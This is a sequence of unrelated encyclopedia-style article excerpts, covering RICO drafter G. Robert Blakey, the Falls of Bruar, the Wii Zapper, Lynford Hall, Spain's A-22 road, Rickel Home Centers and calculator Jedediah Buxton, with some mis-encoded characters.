He is best known for his work in connection with drafting the Racketeer Influenced and Corrupt Organizations Act and for scholarship on that subject. Education and family Blakey, an American Catholic of Irish descent, was born in Burlington, North Carolina. He graduated from the University of Notre Dame in 1957, earning a degree in philosophy with honors, and was elected to Phi Beta Kappa. He then attended Notre Dame Law School, where he was an associate editor of the Notre Dame Law Review and was awarded a J.D. 1960. In April 1958, during his first year of law school, Blakey married Elaine Menard, a graduate of St. Mary's College. The couple had 8 children and 18 grandchildren, and remained married until her death in 2002. He is the father of John Robert Blakey, a United States District Judge of the United States District Court for the Northern District of Illinois, who was formerly chief of the Special Prosecutions Bureau for the Cook County State's Attorney and a special assistant attorney in the United States District Court for the Northern District of Illinois.  RICO and other legislation  Under the close supervision of Senator John Little McClellan, the Chairman of the Committee for which he worked, Blakey drafted the \\"RICO Act,\\" Title IX of the Organized Crime Control Act of 1970, signed into law by Richard M. Nixon. While in law school, Blakey edited a student note on the unsuccessful prosecution of attendees at the Apalachin Meeting, which first sparked his interest in organized crime; he also wrote a note that analyzed civil liberties in the union movement. In 1960, after law school, Blakey joined the United States Department of Justice under its Honor Program, and he became a Special Attorney in the Organized Crime and Racketeering Section of the Criminal Division of the Department. After Robert F. Kennedy became Attorney General, the Department began a major effort to bring criminal prosecutions against organized crime members, corrupt political figures, and faithless union officials. The Section assigned Blakey to the effort. He remained at Justice until 1964, leaving the summer after the November 1963 assassination of John F. Kennedy. Subsequently, numerous states passed racketeering legislation with Blakey's assistance modeled on the federal statute. In addition, under the close supervision of McClellan, Blakey also drafted Title III on wiretapping of the Omnibus Crime Control and Safe Streets Act of 1968. Numerous states, too, have wiretapping legislation modeled on the federal statute, and Blakey aided in those efforts. It is suspected, especially among those in the Italian American community, that Blakey intentionally arrived at the acronym RICO as a left-handed slight at the Italian American ethnicity, since the 'mafia' was a principal target of the law. \\"Rico\\" is a well known nickname for \\"Enrico,\\" the Italian version for Henry and a popular name among Italian American immigrants. Additionally, \\"Rico\\" was the name of an Italian American mobster in the 1930 gangster movie \\"Little Caesar,\\" from which Blakey may have derived the name.Ciolli, Rita. \\"Verdict Rekindles Debate Over Racketeering Law.\\" [New York] Newsday. 12 December 1988 (p. 3). Power, William. \\"This Certainly Takes All the Fun Out of Watching 'Little Caesar'.\\" The Wall Street Journal. 22 August 1988. Assassinations committee Blakey was a Notre Dame law professor from 1964 to 1969, when he returned to Washington as Chief Counsel of Subcommittee on Criminal Laws and Procedures of the Senate Judiciary Committee. John Little McClellan was the Chairman of the Subcommittee. Blakey credits the success of his drafting work to the dedication to needs of law enforcement, the understanding of the drafting and the processing of legislation, and basic sense of fairness of McClellan as well as the extraordinary confidence other members of the Senate placed in McClellan. Only he could have seen to the successful completion of Blakey's handiwork; if Blakey was its draftsman, McClellan was its architect and master builder. During 1967, he was a Consultant on organized crime to the President's Commission on Law Enforcement and the Administration of Justice; Lyndon B. Johnson created the Commission to examine crime in America. It recommended, among other measures, new racketeering and wiretapping legislation. Blakey was Chief Counsel and Staff Director to the U.S. House Select Committee on Assassinations from 1977 to 1979, which investigated the assassinations of John F. Kennedy and Martin Luther King Jr. under the direction of Louis Stokes. Blakey also helped Stokes draft the President John F. Kennedy Assassination Records Collection Act of 1992. He and Richard Billings, the editor of the final report of the Committee, would later write a book about the assassination.  Supreme Court appearances  In Blakey's first appearance before the United States Supreme Court, he filed a brief on behalf of the Attorneys General of Massachusetts and Oregon and the National District Attorneys Association in the case of Berger v. New York (1967), which dealt with wiretapping. He argued on behalf of the Securities Investor Protection Corporation in what became Holmes v. SIPC (1992); he argued on behalf of pro-life activist Joseph Scheidler in what became Scheidler v. National Organization for Women (2006), and he argued on behalf of the beneficiaries of insurance policies in what became Humana, Inc. v. Forsyth (1999). Teaching Blakey served as a law professor at Notre Dame Law School from 1964 to 1969. From 1973 to 1980, he served as a law professor at Cornell Law School, and was director of the Cornell Institute on Organized Crime. In 1980, Blakey returned to teaching law at Notre Dame, and in 1985 was named the William J. and Dorothy K. O'Neill Professor of Law there. In December 2013, the 80 year old retired professor Blakey agreed to accept censure by the D.C. Office of Bar Counsel related to charges made against him for disclosing confidential documents of the General Electric company. Washington D.C. whistleblower attorney Lynne Bernabei, and Blakey's former student (and former General Electric attorney) Adriana Koeck, brought the charges with respect to internal General Electric documents that they had shared with Blakey, and that he subsequently gave to a reporter for The New York Times as well as to the United States Securities and Exchange Commission and federal prosecutors. Blakey told the Bar Counsel office that he believed that the documents could be disclosed because they were covered by a crime/fraud exception to rules forbidding lawyers from disclosing clients' confidential information.http://abovethelaw.com/2015/12/emeritus-law-professor-sanctioned- over-the-disclosure-of-documents/  Selected publications     *  Notes   References  *  Further reading   * Category:1936 births Category:Living people Category:People from Burlington, North Carolina Category:Cornell University faculty Category:University of Notre Dame faculty Category:University of Notre Dame alumni Category:Notre Dame Law School alumni Category:Researchers of the assassination of John F.

They have been a tourist attraction since the 18th century and were immortalized in a poem by Robert Burns, The Humble Petition of Bruar Water to the Noble Duke of Atholl, supposedly from the river itself entreating the Duke to plant some trees in the then barren landscape. Description The falls were probably formed some time in the last 10,000 years, after the retreat of the glaciers at the end of the last ice age. The waters slowly cut through the rock which had been pushed up by the geological forces which formed the Scottish Highlands some 500 million years ago. The layering of the rocks means that the water has cut a meandering path through the softer rock and left the harder rock untouched. This has led to the creation of deep pools, outcrops and, in one place, a natural arch. The falls consist of two large falls and a number of smaller drops. The water is often coloured brown from the peat through which it flows. Nowadays, the A9 Perth to Inverness road passes near the foot of the falls in Glen Garry, and there is a shopping centre and car park from where visitors may access the falls. A circular footpath leads up to the Lower Bridge, close to the natural arch, and continues on to the Upper Bridge, about from the car park, before returning down the opposite bank. The total drop of the falls is about 60 metres. The narrowness of the gorge means that the falls are most impressive after heavy rain, but since the construction of a hydroelectric power scheme in the late 1940s, water is extracted farther up the river and the falls no longer reach the volumes they once did. History The falls first became popular as a tourist attraction at the end of the 18th century. At that time, the Bruar Water flowed through a treeless, barren landscape, and the falls were said to be a somewhat disappointing sight for those forced to make their way over the slippery rocks and steep banks to view them. William Gilpin, who visited the falls in 1776, thought them: Robert Burns, although taken with the falls themselves, was unimpressed by the lack of vegetation. After his visit in 1787, he wrote the poem,The Humble Petition of Bruar Water to the Noble Duke of Atholl. It entreated John Murray, 4th Duke of Atholl, the owner of the land, to plant some trees and bushes around the falls: View down from the Upper Bridge Almost ten years later, after Burn's death in 1796, Murray began an ambitious scheme of planting that would eventually include 120,000 Larch and Scots Pine. The Duke was of the opinion that the planting should be both pleasing to the eye and profitable. He was eventually to become known as \\"Planter John\\", planting over 15 million trees throughout his estates during his lifetime. At the Falls of Bruar he also laid out the path that is still in use today, constructed the two bridges as viewpoints over the falls, and built a large number of huts and shelters. The huts were disliked by some visitors, and eventually fell into disrepair: only the partial remains of one stone hut can still be seen. William Wordsworth objected to the neatness of the paths when he visited in 1815, but the harsh lines of these have mellowed over the years. During the Victorian period many Rhododendron were planted to enhance the landscape. Most of the trees were cut down during World War II. Once hostilities ended, the trees were replanted, again with Scots Pine but this time mixed with Hybrid Larch, Fir and Spruce. Native species were also allowed to colonize the banks: nowadays, the conifers are mixed with Mountain Ash, Willow, Aspen and Birch.

The name is a reference to the NES Zapper light gun for the Nintendo Entertainment System. It is mainly used to enhance controls for shooter games, including light gun shooters, first-person shooters, and third-person shooters. History According to an interview with Shigeru Miyamoto, the idea of a Zapper-type expansion formed when the Wii Remote was first created. He expressed, \\"What we found is that the reason we wanted to have a Zapper is when you hold a Wii Remote, it can be difficult for some people to keep a steady hand. And holding your arm out like that can get your arm somewhat tired.\\"Dean Takahashi, (July 29, 2007). An interview with...Shigeru Miyamoto mercurynews.com. Retrieved on August 5, 2007. A staff member of The Legend of Zelda: Twilight Princesss development team later created a makeshift gun-like frame using rubber bands and wires, which held the Wii Remote and Nunchuk together. In response, Miyamoto stated \\"this isn't the time or the place to be making things like this!\\". However, when Miyamoto held the prototype in his hands, he found it very comfortable. He proposed it to the hardware developers, who started on the formal development project. The Wii Zapper underwent an extensive development period involving many design phases, including one that produced a rumble whenever the player hit a target. To save battery life, the rumble function was abandoned. Prototype \\"Zapper\\" shown in 2006 A \\"Zapper\\" prototype was shown at E3 2006 featuring a shotgun- like design with a \\"trigger hole\\", as well as an analog stick built into the top of the handle. This made it similar to the Nunchuk attachment, but without the accelerometer and the second button. In this version, the \\"gun barrel\\" of the shell housed the Wii Remote and connected with its expansion port. A revised design was revealed on July 11, 2007 at E3 2007 with a form reminiscent of a submachine gun, in which the Wii Remote is fitted in the gun barrel and the Nunchuk is cradled in the rear handle. This design came about with the realization that making the Wii Zapper functionally independent from attachments would \\"allow for more diverse play styles.\\" Some concern has been raised by this arrangement, since most people would naturally end up holding the Nunchuk with their dominant hand and be forced to pull the trigger with their non-dominant hand. Third-party titles designed to support the Wii Zapper include Resident Evil: The Umbrella Chronicles, Ghost Squad, Medal of Honor: Heroes 2,E3 '07: Wii Mario Kart pulls drive-by on Nintendo gathering - Wii News at GameSpot The House of the Dead 2 & 3 Return, House of the Dead: Overkill, Call of Duty: World at War, Wild West Guns, Quantum of Solace, Call of Duty: Modern Warfare Reflex Edition, Dead Space: Extraction, Resident Evil: The Darkside Chronicles, Heavy Fire: Special Operations, Mad Dog McCree: Gunslinger Pack, GoldenEye 007, Brothers in Arms: Double Time and Call of Duty: Black Ops, while Nintendo has supported it with the first-party WiiWare game, Eco Shooter: Plant 530, as well as with Sin and Punishment: Star Successor. The Wii Zapper was first released in Japan on October 25, 2007 as a pack-in with Ghost Squad, with standalone units also made available for purchase on Nintendo's Japanese online store. A bundle with Umbrella Chronicles was later released in the region on November 15, 2007. For other regions, the Wii Zapper is packaged with Link's Crossbow Training, a training game based on The Legend of Zelda: Twilight Princess. It was released in North America on November 19, 2007, in Europe on December 7, 2007 and in Australia on December 13, 2007. Third-party gun accessories Despite an official Wii Zapper expansion released by Nintendo, some gun peripherals have been shown by third parties. The first of these appeared in early April, when video game retailer GameStop listed a \\"Wii Blaster\\" peripheral on its website, with a release date of May 1, 2007. Originally listed without a specified manufacturer, the Wii Blaster had been speculated to be the Zapper, but has since been indicated to be produced by third party accessories manufacturer Core Gamer. According to GameStop on May 5, 2007, the Wii Blaster release date was changed to July 17, 2007. Wii Light Gun Another variation on the official Wii Zapper is the Wii Light Gun. It is designed much like a sub-machine gun, although it is not sold with any games. While not technically an expansion, details on an aesthetic gun accessory for the Wii Remote and Nunchuk, named the \\"Sharp Shooter\\", have been released by third-party manufacturer Joytech. In this accessory, the Wii Remote is housed in the gun barrel. The Nunchuk is fitted into the handle so that the Nunchuk's buttons serve as gun triggers. A new gun peripheral, the Perfect Shot, is designed to be an alternative to the Wii Zapper and is designed by Nyko. It has a pistol-like design that uses only the Wii Remote. Below the Perfect Shot is a slot, where the user can attach the Nunchuk or other Wii Remote add-ons.\\"Nyko Perfect Shot\\", Game Informer 178 (February 2008): 44. Nyko has also released the Pistol Grip, a gun shell of similar design but only compatible with their Wand Wii Remote alternative, due to its digital inputs using their proprietary expansion port. Hong Kong-based accessory manufacturer Brando has also released two Wii gun shells: one of them is the 2-in-1 combined light gun, that very closely resembles the Nyko Perfect Shot, while the other one, named the Wii Cyber Gun, is more similar to the Zapper. A Wii Remote-only gun shell was also released with the game Cocoto Magic Circus. To coincide with the release of the Nerf N-Strike video game, an arcade-style light gun shooter, Hasbro released the N-Strike Switch Shot EX-3, a functional Nerf dart shooter that can be modified by removing the dart shooting mechanism and replacing it with a Wii Remote to allow it to be used as a light gun shell. The Switch Shot is available both in a bundle with the Nerf N-Strike game and as a separate peripheral. Other gun peripherals include a Wii Crossbow, a Wii Magnum, and a Wii Shotgun. A handcannon shell was also released in Australia, the U.K. and Europe with The House of the Dead: Overkill, modeled after the AMS pistols used by the main characters in the game. Another shell shaped like a toy laser gun was released alongside Toy Story Mania! in Europe.

History  Roman Catholic chapel of St Mary and St Stephen The first hall at Lynford was built in about 1500.Historic England - Linford Hall In about 1717 James Nelthorpe acquired the Lynford estate from Sir Charles Turner. He built a new house with pleasant gardens, plantations and water features a little distance from the old hall which became the farm-house. The estate remained in the Nelthorpe family until 1805 when it was acquired by George Eyres. After several other owners, it was purchased by Sir Richard Sutton in 1827. Sutton commissioned the architect Charles Robert Cockerell to alter and remodel the house and expanded the grounds and park. The estate was sold in 1856 to Stephens Lyne-Stephens, who demolished the house in 1863. Stephens was said at the time to be the richest commoner in England and commissioned the present house which was built between 1857 and 1862 by William Burn. He was married to the French ballerina Yolande (Pauline) Duvernay for whom he had a Catholic chapel built out of native flintstone. Stephens died before the estate house was completed, but Yolande retained the house and estate until her death in 1894.Roberts pp. 271-281 Under later owners, regular guests included Joe Kennedy, then the United States ambassador to the United Kingdom.

There are still many signs of the fire, the most obvious being that the third- floor window surrounds now stand proud of the roof. The government used the Hall as a hospital during World War II. Some carved names can still be found in trees on the grounds from this period. The estate house was also used by American forces during World War II, and they installed a hot-water central- heating system for the main building. The Forestry Commission bought the Hall and used it as a training school until the 1960s. By this time the house was poorly maintained and overgrown. In 1960, the house was leased to Peter Widdowson, who, with a partner from London, made some repairs to the house and grounds, operating it as an apartment building, hotel and public house. Later, the Forestry Commission sold the house to John Haire, Baron Haire of Whiteabbey but kept the estate lands which now make up a large part of Thetford Forest. It was bought by Gerald F. Rand in 1970 who converted the house into a private home cum motel, with function facilities. He also developed a mobile home park to the east of the house with some 40 plots. During his ownership the BBC filmed several programmes there, including 'Allo 'Allo!, Dad's Army and You Rang, M'Lord?. After 25 years Rand sold the property, complete with businesses, in the mid-1990s. The British Comedy Society unveiled a blue plaque at Lynford Hall to remember the World War Two- set sitcom 'Allo 'Allo! at an event which saw many of the cast reunited on 7 September 2019.

The route has all sections now open to traffic with the exception of the last 13km into Huesca. The A-22 runs mainly in parallel to the existing N-240 road except for certain specific stretches such as the Monz√≥n bypass which opened in 2008, and the Barbastro bypass where alternative routes have been employed. The construction has been divided into the following sectors, Huesca-Si√©tamo, Si√©tamo-Velillas, Velillas-Ponzano, Ponzano-El Pueyo, Barbastro Bypass, Monz√≥n Bypass, Bin√©far Bypass, Bin√©far Bypass-Arag√≥n/Catalonia border, Arag√≥n/Catalonia border- Almacelles Bypass, Almacelles Bypass-La Cerdera, La Cerdera-Junction with A-2 Motorway at the edge of Lleida [1]. By the summer of 2010 more than half of the A-22 was operational as a four-lane highway comprising 6 of the above sectors. However, in July 2010 a cessation of work due to governmental financial difficulties was announced, despite the Binefar Bypass section being 80% complete. This decision provoked much controversy with local government officials calling for the work to be resumed, citing the dangers associated with the current unfinished road layout [2]. Work was restarted and by 2012 all but one sector was fully open creating an uninterrupted length of around 99km starting from the intersection with the A-2 on the edge of Lleida. The remaining section is the 13km Huesca - Sietamo sector. Construction began in August 2018 and is ongoing. Until this final section is completed in 2021, it will be necessary to transfer onto the N-240 highway to complete the journey into the city of Huesca. The A-22 provides a far more satisfactory communication between Huesca and Lleida and intermediate towns than previously offered by the N-240, but also a direct four-lane highway connection between Huesca and Barcelona, a journey which previously required a long and time- consuming diversion via Zaragoza if motorway standard roads were used. When the final sector is completed, the A-22 will provide direct access to the Autov√≠a A-23 serving Jaca (Arag√≥n) and connecting to the Autov√≠a A-21 for Pamplona (Navarra) using highways which are also undergoing the process of upgrading. The improvements in road communication between Lleida and the province of Huesca are occurring in parallel to developments on the railways in the Lleida area, where a new network of commuter trains (Cercanias) is under consideration. This may include a regular commuter service connecting Lleida, Almacelles, Bin√©far, Monz√≥n [3] - all of which are communities served by the N-240 and A-22. List of major towns connected by the existing N-240 and the A-22, includes Lleida, Almacelles, Bin√©far, Monz√≥n, Barbastro and Huesca.

The company‚Äôs first store opened in 1953 and for three decades Rickel was the leading hardware, plumbing, heating and electrical retailer in its region. At its peak Rickel operated over 90 stores, but competition from Home Depot, debt problems with its former parent, and an ultimately ill-advised merger with competitor Channel Home Centers led to a 1996 bankruptcy filing and liquidation and closure starting in late 1997 and continuing through early 1998.  Founding  The origins of the company date back to 1946 when brothers Al, Mort, and Bob Rickel went into business for themselves in Newark, New Jersey.Roush, Chris, Inside Home Depot, pp.126-30 1999 The brothers formed their own heating business, continuing a family tradition. An anecdotal story says that a few years later, the brothers purchased a warehouse full of plumbing supplies for \\"next to nothing\\". Unlike in most other cases, where heating/cooling and plumbing are usually the domain of plumbers, the Rickels specialized strictly in heat. Thus, they had no idea what the actual value of the haul was and sought help. A friend put them in touch with a plumber named Bill Ryan, who agreed to go through the items and determine how much they would sell for. Plumbing supplies were usually sold wholesale at this time, which presented a problem for Al, Mort, and Bob. With the massive amount of supplies they had, it was likely going to take a significant amount of time for them to sell them off to local plumbers. They came up with an idea that, at the time, had been unheard of. The idea was to start a business selling the supplies to the general public at retail cost, with Ryan as their salesman. In that role, the brothers felt that he could not only sell the supplies to the people but pass along his plumbing knowledge to advise customers on how to fix their own toilets, sinks, drains, etc., and making sure they had the correct parts to perform the repair. So, in 1953 Al, Mort, and Bob opened up the first Rickel Brothers store in Union, New Jersey, and Ryan was warmly referred to as \\"employee number one\\" for his entire 35-year stint with the Rickel store chain. Rickel was one of the first \\"do-it- yourself\\" home improvement stores, eventually expanding beyond plumbing supplies and selling heating and electrical supplies and tools in addition. An early slogan and jingle of the Rickel chain, which lasted in some degree to its 1997 closure, was \\"Rickel Helps You Do it Better- Do it Better With Rickel\\"- a reflection of the Rickel brothers' focus which included employees who could explain to customers how to perform their own home repairs. The concept took off and enabled 'Rickels' (as the store came to be known locally) to develop a loyal customer base.  Growth  The Rickels began expanding quickly after their first store became a success and by the early 1960s were operating three locations, all in New Jersey: Succasunna, Paramus, East Brunswick, and a new location in Union. By 1967 the \\"Rickel Supermarts\\" chain (as the stores were now known) had six stores, all in New Jersey, opening in Menlo Park and Wayne. The Rickels then began expanding at a more rapid pace, opening more stores in New Jersey and entering the New York and Pennsylvania markets for the first time. During this time a corporate headquarters was established in South Plainfield, New Jersey, which also served as Rickel's primary distribution center. Classic Rickel logo on a box of soda syphon chargers. The Rickel brothers sold the still-growing chain of Rickel Supermarts to Supermarkets General Corporation, the parent company of the Pathmark supermarket chain, in 1969. After the sale SGC renamed the chain \\"Rickel Home Centers\\", which lasted until Rickel's closure. In 1973 Rickel built their South Plainfield, New Jersey executive office headquarters, which doubled as a distribution and storage center that had been expanded to nearly 800,000 square feet by 1988. In 1975, the Rickel division of SGC recorded $80 million in sales and was the dominant home improvement retailer in the region, far outselling its larger competitors Channel Lumber and Pergament. The subsequent decade was a time of continued expansion as the Rickel chain grew to over 30 stores by the mid-eighties. Faced with an increasingly competitive market, Rickel attempted to reinvent its image with an upscale decor-oriented store simply called \\"H≈çM\\" in 1990, tested as a prototype store in Toms River, New Jersey However, Supermarkets General's fortunes were starting to turn as the company entered a financial downturn that it stayed locked in, in various forms, for the next two decades. While Rickel was doing well, its corporate sibling Pathmark was losing business and dragging the company's finances down with it. In 1987, the Dart Group made a hostile takeover bid to acquire SGC. In a move to avoid the takeover, management took the company private by engineering a $2.1 billion leveraged buyout. Merrill Lynch Capital Markets Inc. received 55 percent of the shares, Equitable Life Assurance received 30 percent and SGC management retained ten percent. The company's debt grew to $1.6 billion by early 1990, half of it in junk bonds, primarily as a result of the buyout. Servicing the debt became SGC's primary objective and largest problem.  Home Depot competition  Around the time of Supermarkets General's cash flow problems, the Atlanta, Georgia-based home improvement chain Home Depot began to open stores in the New York/New Jersey metropolitan area. Although Rickel, Channel, Pergament, and local hardware stores all felt the effects of Home Depot's entry and quick expansion into their market area, Rickel's problems were made worse by its parent company's financial state. This helped lead to a somewhat contentious relationship between Rickel and Home Depot over the next few years. An early example of the consequences of the rivalry between Rickel and Home Depot can be seen in an incident surrounding PBS' long running home improvement series This Old House. For many years, Home Depot has been one of the largest sources of financial support for the noncommercial program. In 1989, however, this relationship nearly came to an end. This Old House host Bob Vila, who had been with the show since its 1979 debut, signed an endorsement deal with Rickel and did a series of commercials for them. Home Depot was angered by this and, citing Vila's work for a competing business, pulled its backing from This Old House and its lumber supplier, Weyerhaeuser, followed. WGBH, the producer of This Old House, responded by firing Vila from the show and replacing him with Steve Thomas in an attempt to convince Home Depot to return, which they did. (Vila eventually launched his own television series, Home Again with Bob Vila, the following year and hosted it for sixteen seasons. His relationship with Rickel did not last long, as he became a spokesman Craftsman Tools and Sears shortly after leaving This Old House.) Combined with Home Depot's expansion and its parent company's debt problems, not only did Rickel find itself unable to compete with the rapidly growing Home Depot, but it also began to lose market share to its local competitors who were on more secure financial footing. By fall 1993 it became apparent that Rickel's future was beginning to look grim. Supermarkets General was still in serious financial trouble as Pathmark's sales continued to slide, and the company chose to keep its focus on trying to bring its primary brand out of decline. As a consequence of this, Rickel was unable to receive the funding it needed to properly compete with the juggernaut that Home Depot was becoming. In 1994, Supermarkets General reorganized. The company changed its name to Pathmark Stores, Inc. and began looking for ways to divest itself of its varied retail properties including Rickel. In the summer of 1994, they found a solution. Merger Eos Partners L.P., a venture capital firm based in New York, made a bid for Rickel that Pathmark accepted on August 26, 1994. After that, Eos struck a second agreement with GE Capital, another venture capital firm which owned Rickel's competitor Channel, later that day. When the entirety of both deals were revealed, Eos announced that its new acquisitions would merge into one. 59 of Channel's 60 stores became Rickel locations; in the other remaining case, Rickel operated a store in the former Ice World hockey arena in Totowa, New Jersey and opted to keep it over the Channel location that was nearby despite the Channel store being significantly larger. The merged company briefly rebranded itself as \\"The New Rickel\\" to reflect its change in direction. This was Rickel's first large wave of expansion since the 1960s and the chain's overall largest, as Rickel's locations nearly tripled and it had opened stores in many new cities and towns it had not served before. Rickel thus adopted a new slogan, \\"Bringing it all closer to home\\", to acknowledge this. However, all the news was not positive. Despite the addition of so many new stores to its fold, the sales they generated were not enough to fully pull Rickel out of the tailspin it had found itself in; in fact, the sudden massive expansion proved to be another burden on the company's finances. Also, the battle with Home Depot for market share was continuing to be an uphill one for Rickel, and the chain would soon find itself in significant legal trouble. Home Depot sues Rickel By 1995, Home Depot was establishing itself as New Jersey's home improvement leader and building stores almost anywhere demand existed, putting significant strain on Rickel and its competitors that had long been established before Home Depot's encroachment. One of these areas was a large vacant parcel of land on Orange Street in Bloomfield, New Jersey. Home Depot submitted a proposal to take over the land and build a massive store on it. The Orange Street location was less than one mile from the Bloomfield Center strip mall where Rickel, at the time, was its longstanding anchor store. The center is located along Bloomfield Avenue, which is a significant thoroughfare in the area as it begins West Caldwell and passes through several municipalities in Essex County before terminating near Newark Broad Street Station. In addition to being on such a heavily traveled stretch of road, the center's location enabled it to draw from four different municipalities. A sliver of Belleville, New Jersey's border with Bloomfield was just past the center with the Roseville section of Newark just beyond that. Furthermore, residents of East Orange, New Jersey had access from Ampere Parkway, a major roadway in that city which ran into Bloomfield and terminated just across from the strip mall. However, like many of its fellow outlets the Bloomfield Rickel was a much smaller sized business than the massive Home Depot stores being built in and around New Jersey were. Rickel certainly was not in a good position as even though their store was in a centralized location, the Home Depot store would siphon away a significant amount of their customers. In addition, the store would have easy access as it was located very near Bloomfield's border with Orange and located near public transit on nearby Watsessing Avenue (including a New Jersey Transit rail station) and Exit 148 on the Garden State Parkway. Rickel decided to fight the proposal. Its methods, however, led to Home Depot filing a lawsuit in New Jersey court in July of that year. Home Depot alleged that Rickel had engaged in a deceitful \\"smear campaign\\"; Rickel was accused of posing as a community action group that accused Home Depot of bringing an increase of car theft and violent crime everywhere they opened stores, specifically citing figures obtained from the police in Clifton, New Jersey, a neighboring municipality to Bloomfield where Home Depot first opened a store in 1992 (Rickel, at that time, was not doing business in Clifton; after the merger with Channel in 1994, Rickel took over the lone Channel Home Center in the city). Bankruptcy and liquidation If things were not bad enough, by the end of 1995 Rickel discovered that their financial situation was significantly more unstable than they had realized. The new sales figures from its fifty-nine new stores had not done enough to correct the damage that the years of financial trouble that its former parent Pathmark had left on Rickel, and thus a bankruptcy filing was looming as a serious possibility. To try and stave it off, the company decided to close thirteen underperforming stores shortly after the Home Depot lawsuit was filed. This did not work, and on January 10, 1996, Rickel announced it had filed for Chapter 11 bankruptcy protection. More store closures followed, with another thirteen locations liquidated by July. Although Rickel was starting to show signs of recovery that met with positive reactions, reality painted a different picture as the company appeared to be in a state of terminal decline. Rickel went through two more rounds of closures that ran into 1997; when those were done, the chain was almost half the size of what it had been just two years before, with 49 locations still operating. In 1997 Rickel decided to shift focus again and focus less on being a direct competitor to Home Depot, which had now established itself as the New York area market leader in retail home improvement. Instead, Rickel decided to focus on things that made it unique compared to the larger, big-box chain. Although Rickel was one of the larger and more successful home improvement chains in the area prior to Home Depot's entry into its market, Rickel tended to operate in smaller facilities than Home Depot did even after its merger with Channel. For example, a typical Home Depot store was well over in size. Rickel stores, by comparison, averaged approximately with a handful of stores such as the Totowa, New Jersey store and the Wayne, New Jersey store being larger (the Wayne store was, in fact, the company's largest). Rickel decided, as they had tried once before, to use their size to their advantage and define themselves as more of a neighborhood home center. Since both Rickel and Home Depot sold many of the same items, Rickel's strategy was to portray the stores as much easier to shop at than the immense Home Depot stores. The attempt did little, if anything, to either take business from Home Depot or lure customers to Rickel and in August 1997, a plan to allow the chain to remain open until at least February 1998 was rejected. Despite its best efforts, it now seemed that it was no longer a matter of if the still-in-bankruptcy Rickel could reverse its fortunes and stave off its demise but instead a matter of how much time the former home improvement stalwart had left before it would be forced to close its doors for good. On October 11, 1997, Rickel vice president for marketing Greg Hanselman made the announcement that the company \\"ran out of cash\\" to operate the remaining 49 stores and that the chain was to begin liquidating. Most of the Rickels were closed by Thanksgiving 1997, with several more lasting until December as they received more merchandise from already shuttered stores. The last Rickel to close was its largest, with the Wayne store closing in early 1998. Rickel still held leases on the 53 stores they were operating at the beginning of 1997, and office supply chain Staples picked up 41 of those leases, including Rickel's Bloomfield store that they had been sued trying to protect. Staples did not reopen all of the Rickel locations they purchased, however, as there were objections raised by some of the tenants and landlords involving six of the forty-one purchases. The company's distribution center, meanwhile, was retaken by Pathmark. As far as the other stores mentioned in this portion of the article are concerned, the Totowa store was repurposed as a clothing retailer, first being occupied by Filene's Basement's Aisle 3 concept and later by Forman Mills. The Clifton store, which was one of the six Staples purchases that were not converted to Staples, was subdivided after its closure, with space leased to Dollar Tree and Drug Fair; Dollar Tree has since expanded into the portion occupied by the former Drug Fair, which closed in 2009 following the company's sudden bankruptcy and liquidation, and the remainder has seen several stores attempt to do business there and fail. The Wayne store was subdivided after its closure. The rear portion of the store was converted into a bowling alley while the remainder was demolished.

The Villager's stores remained open as smaller Home Depot locations and were all closed in 2008; Home Depot cited the bursting of the housing bubble as the reasoning.http://www.nj.com/business/index.ssf/2008/05/home_depot_shuts_15_stores.html Fate of the Rickels All three Rickel brothers have since died.

Jedediah Buxton (1707‚Äì1772) was a noted English mental calculator, born at Elmton, near Creswell, in Derbyshire.W. W. Rouse Ball (1960) Calculating Prodigies, in Mathematical Recreations and Essays, Macmillan, New York, chapter 13. He was one of the earliest people referred to as an autistic savant. Life Buxton was born in 1707 and although his father was schoolmaster of Elmton, and his grandfather had been the vicar, he could not write; and his knowledge, except of numbers, was extremely limited. How he came to understand the relative proportions of numbers, and their progressive denominations, he did not remember. However this was his interest. He frequently took no notice of objects, and when he did, it was only with reference to their numbers. After hearing a sermon he knew nothing about its content other than that it contained a certain number of words which he had counted during its delivery. He measured the lands of Elmton, consisting of some thousand acres (4 km¬≤), simply by striding over it. He gave the area not only in acres, roods and perches, but even in square inches. After this, he reduced them into square hairs'-breadths, reckoning forty-eight to each side of the inch. His memory was so great, that in resolving a question he could leave off and resume the operation again at the same point after the lapse of several months. His perpetual application to figures prevented the acquisition of other knowledge. Among the examples of Buxton's arithmetical feats which are given are his calculation of the product of a farthing doubled 139 times. The result, expressed in pounds, extends to thirty-nine figures, and is correct so far as it can be readily verified by the use of logarithms. Buxton afterwards multiplied this enormous number by itself. It appears that he had invented an original nomenclature for large numbers, a 'tribe' being the cube of a million, and a 'cramp' (if Mr. Holliday's statement can be trusted) a thousand 'tribes of tribes'. Journey to London His mental acuity was tested in 1754 by the Royal Society when he walked to London, who acknowledged their satisfaction by presenting him with a handsome gratuity. During his visit to the metropolis he was taken to see the tragedy of Richard III. performed at Drury Lane theatre, but his whole mind was given to the counting of the words uttered by David Garrick. Similarly, he set himself to count the steps of the dancers; and he declared that the innumerable sounds produced by the musical instruments had perplexed him beyond measure. A memoir appeared in the Gentleman's Magazine for June 1754, to which (probably through the medium of a Mr Holliday, of Haughton Hall, Nottinghamshire), Buxton had contributed several letters. In this memoir, his age is given as forty-nine, which points to his birth in 1705; the date adopted above is on the authority of Daniel and Samuel Lysons' Magna Britannia (Derbyshire). His image can be seen online in the New York Library.Gallery collection A portrait by Miss Maria Hartley in 1764 hangs in Elmton Church. Jedediah Buxton was the son of William Buxton, a farmer and also the schoolmaster at Elmton. However, the Vicar of Elmton was not Jedediah's biological grandfather. John Davenport, the Vicar of Elmton, 1689‚Äì1709, was the second husband of Ann (William Buxton's mother). She had been previously married to Jedidiah's paternal grandfather, Edward Buxton of Chelmorton.See John Davenport's Will dated 1709 at Lichfield Record Office and also his Wife's administration papers of 1716.

